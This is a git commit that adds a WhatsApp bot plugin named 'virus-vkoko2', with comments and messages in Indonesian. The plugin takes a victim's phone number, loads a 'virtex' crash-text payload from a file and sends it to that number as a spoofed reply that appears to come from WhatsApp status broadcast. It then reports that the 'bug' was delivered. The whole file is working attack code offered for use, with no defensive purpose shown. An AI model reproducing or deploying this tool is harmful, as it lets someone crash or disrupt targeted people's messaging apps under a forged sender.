c53dc440e5cd44089383937e99a60a081a3b9800
ᵈʳᴋᴏᴋᴏ ᴘᴀ፝֟፝֟ɴɢᴇʀᴀɴ <104513437+MendingTuru@users.noreply.github.com>
2022-11-17 04:31:00 +0700

    Create virus-vkoko2.js

---
+++ plugins/virus-vkoko2.js
@@ -0,0 +1,35 @@
+let fs = require('fs')
+let handler = async(m, { conn, text, usedPrefix }) => {
+let [number, bebas] = text.split `|`
+    if (!number) return conn.reply(m.chat, 'Silahkan masukan nomor yang akan dikirim', m)
+    if (!bebas) return conn.reply(m.chat, 'Silahkan masukan pesannya', m)
+    if (text > 500) return conn.reply(m.chat, 'Teks Kepanjangan!', m)    
+    let user = global.db.data.users[m.sender]
+   
+
+    let vir = fs.readFileSync('../virtex/virtex2.js')
+    let korban = `${number}`
+    var nomor = m.sender
+    
+
+    conn.fakeReply(korban + '@s.whatsapp.net', vir, '0@s.whatsapp.net', '馃敟 *MAKAN NIH BUG* 馃敟', 'status@broadcast')
+    let logs = `[!] Berhasil Mengirim Bug WhatsApp Ke Nomor ${korban}`
+    conn.reply(m.chat, logs, m)
+
+}
+
+handler.help = ['vkoko2 <nomor>|<text bebas>']
+handler.tags = ['virus']
+handler.command = /^(vkoko2)$/i
+handler.owner = true
+handler.rowner = false
+handler.limit = false
+handler.premium = false
+handler.group = false
+handler.private = false
+
+handler.admin = false
+handler.botAdmin = false
+handler.fail = null
+
+module.exports = handler
